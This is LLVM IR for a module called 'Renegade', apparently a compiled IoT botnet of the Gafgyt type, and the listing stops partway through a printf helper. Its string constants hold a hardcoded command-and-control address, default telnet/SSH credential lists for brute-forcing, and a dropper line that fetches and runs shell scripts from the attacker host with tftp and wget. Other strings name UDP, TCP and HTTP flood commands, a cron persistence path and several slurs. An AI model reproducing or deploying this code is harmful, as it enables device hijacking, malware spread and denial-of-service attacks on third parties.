; ModuleID = 'host/ir_O1/Renegade.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i32, i16, i8* }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.ifreq = type { %union.anon.6, %union.anon.7 }
%union.anon.6 = type { [16 x i8] }
%union.anon.7 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@commServer = local_unnamed_addr global [1 x i8*] [i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str, i32 0, i32 0)], align 8
@.str = private unnamed_addr constant [21 x i8] c"94.140.120.196:23913\00", align 1
@mainCommSock = local_unnamed_addr global i32 0, align 4
@currentServer = local_unnamed_addr global i32 -1, align 4
@gotIP = local_unnamed_addr global i32 0, align 4
@numpids = local_unnamed_addr global i64 0, align 8
@macAddress = local_unnamed_addr global [6 x i8] zeroinitializer, align 1
@usernames = local_unnamed_addr global [10 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.10, i32 0, i32 0)], align 16
@.str.1 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.3 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.4 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.5 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@.str.6 = private unnamed_addr constant [6 x i8] c"ubnt\00\00", align 1
@.str.7 = private unnamed_addr constant [8 x i8] c"telnet\00\00", align 1
@.str.8 = private unnamed_addr constant [8 x i8] c"D-Link\00\00", align 1
@.str.9 = private unnamed_addr constant [4 x i8] c"pi\00\00", align 1
@.str.10 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@passwords = local_unnamed_addr global [18 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.10, i32 0, i32 0)], align 16
@.str.11 = private unnamed_addr constant [6 x i8] c"1234\00\00", align 1
@.str.12 = private unnamed_addr constant [7 x i8] c"12345\00\00", align 1
@.str.13 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@.str.14 = private unnamed_addr constant [10 x i8] c"dreambox\00\00", align 1
@.str.15 = private unnamed_addr constant [9 x i8] c"letmein\00\00", align 1
@.str.16 = private unnamed_addr constant [12 x i8] c"epicrouter\00\00", align 1
@.str.17 = private unnamed_addr constant [11 x i8] c"raspberry\00\00", align 1
@.str.18 = private unnamed_addr constant [10 x i8] c"changeme\00\00", align 1
@pids = common local_unnamed_addr global i32* null, align 8
@ourIP = common local_unnamed_addr global %struct.in_addr zeroinitializer, align 4
@scanPid = common local_unnamed_addr global i32 0, align 4
@Q = internal unnamed_addr global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal unnamed_addr global i32 4095, align 4
@c = internal unnamed_addr global i32 362436, align 4
@.str.85 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.19 = private unnamed_addr constant [9 x i8] c"buf: %s\0A\00", align 1
@fdopen_pids = internal unnamed_addr global i32* null, align 8
@hextable = internal unnamed_addr constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.20 = private unnamed_addr constant [14 x i8] c"/proc/cpuinfo\00", align 1
@.str.21 = private unnamed_addr constant [9 x i8] c"BOGOMIPS\00", align 1
@.str.23 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@.str.24 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.25 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.26 = private unnamed_addr constant [9 x i8] c"assword:\00", align 1
@.str.27 = private unnamed_addr constant [5 x i8] c"user\00", align 1
@.str.28 = private unnamed_addr constant [5 x i8] c"pass\00", align 1
@.str.29 = private unnamed_addr constant [5 x i8] c"name\00", align 1
@.str.30 = private unnamed_addr constant [5 x i8] c"word\00", align 1
@.str.31 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.32 = private unnamed_addr constant [8 x i8] c"invalid\00", align 1
@.str.33 = private unnamed_addr constant [10 x i8] c"incorrect\00", align 1
@.str.34 = private unnamed_addr constant [5 x i8] c"fail\00", align 1
@.str.35 = private unnamed_addr constant [6 x i8] c"again\00", align 1
@.str.36 = private unnamed_addr constant [6 x i8] c"wrong\00", align 1
@.str.37 = private unnamed_addr constant [13 x i8] c"accessdenied\00", align 1
@.str.38 = private unnamed_addr constant [6 x i8] c"error\00", align 1
@.str.39 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@.str.40 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.41 = private unnamed_addr constant [193 x i8] c"cd /tmp || cd /var/run;rm -f ng.sh gchq.sh;tftp -r ng.sh -g 94.140.120.196;chmod +x ng.sh;sh ng.sh;rm -f ng.sh;wget -q http://94.140.120.196/gchq.sh;chmod +x gchq.sh;sh gchq.sh;rm -f gchq.sh\0D\0A\00", align 1
@.str.42 = private unnamed_addr constant [3 x i8] c"as\00", align 1
@.str.43 = private unnamed_addr constant [10 x i8] c"/bin/sh\0D\0A\00", align 1
@.str.44 = private unnamed_addr constant [13 x i8] c"shell exec\0D\0A\00", align 1
@.str.45 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.46 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.47 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.48 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.49 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.50 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.51 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.52 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.53 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.54 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.55 = private unnamed_addr constant [17 x i8] c"wget -O /tmp/fff\00", align 1
@.str.56 = private unnamed_addr constant [14 x i8] c" > /dev/null \00", align 1
@.str.57 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.58 = private unnamed_addr constant [14 x i8] c"FUCKINGFAGGOT\00", align 1
@.str.59 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.60 = private unnamed_addr constant [11 x i8] c"GETLOCALIP\00", align 1
@.str.61 = private unnamed_addr constant [10 x i8] c"My IP: %s\00", align 1
@.str.62 = private unnamed_addr constant [8 x i8] c"SCANNER\00", align 1
@.str.63 = private unnamed_addr constant [33 x i8] c"SCANNER SSH/TEL ON | SSH/TEL OFF\00", align 1
@.str.64 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.65 = private unnamed_addr constant [10 x i8] c"tel d0rk\0A\00", align 1
@.str.66 = private unnamed_addr constant [7 x i8] c"TEL ON\00", align 1
@.str.67 = private unnamed_addr constant [10 x i8] c"tel f0rk\0A\00", align 1
@.str.68 = private unnamed_addr constant [7 x i8] c"SSH ON\00", align 1
@.str.69 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.70 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.71 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.72 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.73 = private unnamed_addr constant [11 x i8] c"Killed %d.\00", align 1
@.str.74 = private unnamed_addr constant [13 x i8] c"None Killed.\00", align 1
@.str.75 = private unnamed_addr constant [13 x i8] c"LUCKYLILDUDE\00", align 1
@.str.76 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.77 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.78 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@main.ismokeweed = private unnamed_addr constant [50 x i8] c"/etc/cron.hourly/sockaddr\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00", align 16
@main.r00t3d = private unnamed_addr constant [11 x i8] c"shell exec\00", align 1
@.str.79 = private unnamed_addr constant [3 x i8] c"w+\00", align 1
@.str.81 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.82 = private unnamed_addr constant [8 x i8] c"FUCKYOU\00", align 1
@.str.83 = private unnamed_addr constant [14 x i8] c"GUCCILILNIGGA\00", align 1
@.str.84 = private unnamed_addr constant [2 x i8] c" \00", align 1
@ipState.1 = internal unnamed_addr global i8 0, align 1
@ipState.2 = internal unnamed_addr global i8 0, align 1
@ipState.3 = internal unnamed_addr global i8 0, align 1
@ipState.4 = internal unnamed_addr global i8 0, align 1

; Function Attrs: noinline norecurse nounwind uwtable
define void @init_rand(i32) local_unnamed_addr #0 {
  store i32 %0, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %2 = add i32 %0, -1640531527
  store i32 %2, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %3 = add i32 %0, 1013904242
  store i32 %3, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  br label %4

; <label>:4:                                      ; preds = %17, %1
  %indvars.iv = phi i64 [ 3, %1 ], [ %indvars.iv.next.1, %17 ]
  %5 = add nsw i64 %indvars.iv, -3
  %6 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %5
  %7 = load i32, i32* %6, align 4
  %8 = add nsw i64 %indvars.iv, -2
  %9 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %8
  %10 = load i32, i32* %9, align 4
  %11 = trunc i64 %indvars.iv to i32
  %12 = xor i32 %11, -1640531527
  %13 = xor i32 %12, %7
  %14 = xor i32 %13, %10
  %15 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %indvars.iv
  store i32 %14, i32* %15, align 4
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, 4096
  br i1 %exitcond, label %16, label %17

; <label>:16:                                     ; preds = %4
  ret void

; <label>:17:                                     ; preds = %4
  %18 = add nsw i64 %indvars.iv, -2
  %19 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %18
  %20 = load i32, i32* %19, align 4
  %21 = add nsw i64 %indvars.iv, -1
  %22 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %21
  %23 = load i32, i32* %22, align 4
  %24 = trunc i64 %indvars.iv.next to i32
  %25 = xor i32 %24, -1640531527
  %26 = xor i32 %25, %20
  %27 = xor i32 %26, %23
  %28 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %indvars.iv.next
  store i32 %27, i32* %28, align 4
  %indvars.iv.next.1 = add nsw i64 %indvars.iv, 2
  br label %4
}

; Function Attrs: noinline norecurse nounwind uwtable
define i32 @rand_cmwc() local_unnamed_addr #0 {
  %1 = load i32, i32* @rand_cmwc.i, align 4
  %2 = add i32 %1, 1
  %3 = and i32 %2, 4095
  store i32 %3, i32* @rand_cmwc.i, align 4
  %4 = zext i32 %3 to i64
  %5 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %4
  %6 = load i32, i32* %5, align 4
  %7 = zext i32 %6 to i64
  %8 = mul nuw nsw i64 %7, 18782
  %9 = load i32, i32* @c, align 4
  %10 = zext i32 %9 to i64
  %11 = add nuw nsw i64 %8, %10
  %12 = lshr i64 %11, 32
  %13 = trunc i64 %12 to i32
  %14 = add nuw nsw i64 %12, %11
  %15 = trunc i64 %14 to i32
  %16 = icmp ult i32 %15, %13
  %17 = zext i1 %16 to i32
  %storemerge = add nuw nsw i32 %17, %13
  store i32 %storemerge, i32* @c, align 4
  %.neg7 = sext i1 %16 to i32
  %.0.neg = sub i32 -2, %15
  %18 = add i32 %.0.neg, %.neg7
  %19 = load i32, i32* @rand_cmwc.i, align 4
  %20 = zext i32 %19 to i64
  %21 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %20
  store i32 %18, i32* %21, align 4
  ret i32 %18
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8* nocapture) local_unnamed_addr #1 {
  %2 = tail call i64 @strlen(i8* %0) #14
  %3 = add i64 %2, 4294967295
  br label %4

; <label>:4:                                      ; preds = %4, %1
  %indvars.iv29 = phi i64 [ %indvars.iv.next30, %4 ], [ 0, %1 ]
  %5 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv29
  %6 = load i8, i8* %5, align 1
  %7 = sext i8 %6 to i32
  %8 = tail call i32 @isspace(i32 %7) #14
  %9 = icmp eq i32 %8, 0
  %indvars.iv.next30 = add nuw i64 %indvars.iv29, 1
  br i1 %9, label %.preheader, label %4

.preheader:                                       ; preds = %4
  %10 = trunc i64 %3 to i32
  %11 = trunc i64 %indvars.iv29 to i32
  %12 = icmp slt i32 %10, %11
  br i1 %12, label %.critedge.preheader, label %.lr.ph22.preheader

.lr.ph22.preheader:                               ; preds = %.preheader
  %sext = shl i64 %3, 32
  %13 = ashr exact i64 %sext, 32
  %sext31 = shl i64 %indvars.iv29, 32
  %14 = ashr exact i64 %sext31, 32
  br label %.lr.ph22

.critedge.preheader.loopexit:                     ; preds = %.lr.ph22, %25
  %.0.lcssa.ph = phi i32 [ %24, %.lr.ph22 ], [ %26, %25 ]
  br label %.critedge.preheader

.critedge.preheader:                              ; preds = %.critedge.preheader.loopexit, %.preheader
  %.0.lcssa = phi i32 [ %10, %.preheader ], [ %.0.lcssa.ph, %.critedge.preheader.loopexit ]
  %15 = icmp sgt i32 %11, %.0.lcssa
  br i1 %15, label %.critedge._crit_edge, label %.critedge.preheader26

.critedge.preheader26:                            ; preds = %.critedge.preheader
  %sext32 = shl i64 %indvars.iv29, 32
  %16 = ashr exact i64 %sext32, 32
  %sext33 = shl i64 %indvars.iv29, 32
  %17 = ashr exact i64 %sext33, 32
  %18 = sext i32 %.0.lcssa to i64
  br label %.critedge

.lr.ph22:                                         ; preds = %.lr.ph22.preheader, %25
  %indvars.iv27 = phi i64 [ %13, %.lr.ph22.preheader ], [ %indvars.iv.next28, %25 ]
  %.021 = phi i32 [ %10, %.lr.ph22.preheader ], [ %26, %25 ]
  %19 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv27
  %20 = load i8, i8* %19, align 1
  %21 = sext i8 %20 to i32
  %22 = tail call i32 @isspace(i32 %21) #14
  %23 = icmp eq i32 %22, 0
  %24 = trunc i64 %indvars.iv27 to i32
  br i1 %23, label %.critedge.preheader.loopexit, label %25

; <label>:25:                                     ; preds = %.lr.ph22
  %indvars.iv.next28 = add nsw i64 %indvars.iv27, -1
  %26 = add nsw i32 %.021, -1
  %27 = icmp sgt i64 %indvars.iv27, %14
  br i1 %27, label %.lr.ph22, label %.critedge.preheader.loopexit

.critedge:                                        ; preds = %.critedge.preheader26, %.critedge
  %indvars.iv = phi i64 [ %16, %.critedge.preheader26 ], [ %indvars.iv.next, %.critedge ]
  %28 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %29 = load i8, i8* %28, align 1
  %30 = sub nsw i64 %indvars.iv, %17
  %31 = getelementptr inbounds i8, i8* %0, i64 %30
  store i8 %29, i8* %31, align 1
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %32 = icmp slt i64 %indvars.iv, %18
  br i1 %32, label %.critedge, label %.critedge._crit_edge.loopexit

.critedge._crit_edge.loopexit:                    ; preds = %.critedge
  br label %.critedge._crit_edge

.critedge._crit_edge:                             ; preds = %.critedge._crit_edge.loopexit, %.critedge.preheader
  %.019.lcssa = phi i64 [ %indvars.iv29, %.critedge.preheader ], [ %indvars.iv.next, %.critedge._crit_edge.loopexit ]
  %33 = sub i64 %.019.lcssa, %indvars.iv29
  %sext34 = shl i64 %33, 32
  %34 = ashr exact i64 %sext34, 32
  %35 = getelementptr inbounds i8, i8* %0, i64 %34
  store i8 0, i8* %35, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %2 = alloca [1 x %struct.__va_list_tag], align 16
  %3 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %2, i64 0, i64 0
  %4 = bitcast [1 x %struct.__va_list_tag]* %2 to i8*
  call void @llvm.va_start(i8* nonnull %4)
  %5 = call fastcc i32 @print(i8** null, i8* %0, %struct.__va_list_tag* nonnull %3)
  ret i32 %5
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #3

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @print(i8**, i8* nocapture readonly, %struct.__va_list_tag*) unnamed_addr #1 {
  %4 = alloca [2 x i8], align 1
  %5 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %6 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %7 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %8 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %9 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %10 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %11 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %12 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %13 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %14 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %15 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %16 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %17 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %18 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %19 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %20 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %21 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %22 = getelementptr inbounds [2 x i8], [2 x i8]* %4, i64 0, i64 0
  %23 = getelementptr inbounds [2 x i8], [2 x i8]* %4, i64 0, i64 1
  %24 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  br label %25

; <label>:25:                                     ; preds = %153, %3
  %.061 = phi i32 [ 0, %3 ], [ %.162, %153 ]
  %.0 = phi i8* [ %1, %3 ], [ %154, %153 ]
  %26 = load i8, i8* %.0, align 1
  switch i8 %26, label %149 [
    i8 0, label %155
    i8 37, label %27
  ]

; <label>:27:                                     ; preds = %25
  %28 = getelementptr inbounds i8, i8* %.0, i64 1
  %29 = load i8, i8* %28, align 1
  switch i8 %29, label %.preheader70 [
    i8 0, label %155
    i8 37, label %149
    i8 45, label %30
  ]

; <label>:30:                                     ; preds = %27
  %31 = getelementptr inbounds i8, i8* %.0, i64 2
  br label %.preheader70

.preheader70:                                     ; preds = %30, %27
  %.063.ph = phi i32 [ 0, %27 ], [ 1, %30 ]
  %.1.ph = phi i8* [ %28, %27 ], [ %31, %30 ]
  %32 = load i8, i8* %.1.ph, align 1
  %33 = icmp eq i8 %32, 48
  br i1 %33, label %.lr.ph.preheader, label %.preheader

.lr.ph.preheader:                                 ; preds = %.preheader70
  br label %.lr.ph

.preheader.loopexit:                              ; preds = %.lr.ph
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader70
  %.063.lcssa = phi i32 [ %.063.ph, %.preheader70 ], [ %37, %.preheader.loopexit ]
  %.1.lcssa = phi i8* [ %.1.ph, %.preheader70 ], [ %36, %.preheader.loopexit ]
  %34 = load i8, i8* %.1.lcssa, align 1
  %.off74 = add i8 %34, -48
  %35 = icmp ult i8 %.off74, 10
  br i1 %35, label %.lr.ph77.preheader, label %.critedge

.lr.ph77.preheader:                               ; preds = %.preheader
  br label %.lr.ph77

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.172 = phi i8* [ %36, %.lr.ph ], [ %.1.ph, %.lr.ph.preheader ]
  %.06371 = phi i32 [ %37, %.lr.ph ], [ %.063.ph, %.lr.ph.preheader ]
  %36 = getelementptr inbounds i8, i8* %.172, i64 1
  %37 = or i32 %.06371, 2
  %38 = load i8, i8* %36, align 1
  %39 = icmp eq i8 %38, 48
  br i1 %39, label %.lr.ph, label %.preheader.loopexit

.lr.ph77:                                         ; preds = %.lr.ph77.preheader, %.lr.ph77
  %40 = phi i8 [ %46, %.lr.ph77 ], [ %34, %.lr.ph77.preheader ]
  %.276 = phi i8* [ %45, %.lr.ph77 ], [ %.1.lcssa, %.lr.ph77.preheader ]
  %.06475 = phi i32 [ %44, %.lr.ph77 ], [ 0, %.lr.ph77.preheader ]
  %41 = zext i8 %40 to i32
  %42 = mul nsw i32 %.06475, 10
  %43 = add i32 %42, -48
  %44 = add i32 %43, %41
  %45 = getelementptr inbounds i8, i8* %.276, i64 1
  %46 = load i8, i8* %45, align 1
  %.off = add i8 %46, -48
  %47 = icmp ult i8 %.off, 10
  br i1 %47, label %.lr.ph77, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph77
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %.preheader
  %.064.lcssa = phi i32 [ 0, %.preheader ], [ %44, %.critedge.loopexit ]
  %.2.lcssa = phi i8* [ %.1.lcssa, %.preheader ], [ %45, %.critedge.loopexit ]
  %.lcssa = phi i8 [ %34, %.preheader ], [ %46, %.critedge.loopexit ]
  switch i8 %.lcssa, label %153 [
    i8 115, label %48
    i8 100, label %68
    i8 120, label %84
    i8 88, label %100
    i8 117, label %116
    i8 99, label %132
  ]

; <label>:48:                                     ; preds = %.critedge
  %49 = load i32, i32* %5, align 8
  %50 = icmp ult i32 %49, 41
  br i1 %50, label %51, label %56

; <label>:51:                                     ; preds = %48
  %52 = load i8*, i8** %6, align 8
  %53 = sext i32 %49 to i64
  %54 = getelementptr i8, i8* %52, i64 %53
  %55 = add i32 %49, 8
  store i32 %55, i32* %5, align 8
  br label %59

; <label>:56:                                     ; preds = %48
  %57 = load i8*, i8** %7, align 8
  %58 = getelementptr i8, i8* %57, i64 8
  store i8* %58, i8** %7, align 8
  br label %59

; <label>:59:                                     ; preds = %56, %51
  %.in69 = phi i8* [ %54, %51 ], [ %57, %56 ]
  %60 = bitcast i8* %.in69 to i32*
  %61 = load i32, i32* %60, align 4
  %62 = sext i32 %61 to i64
  %63 = inttoptr i64 %62 to i8*
  %64 = icmp ne i32 %61, 0
  %65 = select i1 %64, i8* %63, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.85, i64 0, i64 0)
  %66 = tail call fastcc i32 @prints(i8** %0, i8* %65, i32 %.064.lcssa, i32 %.063.lcssa)
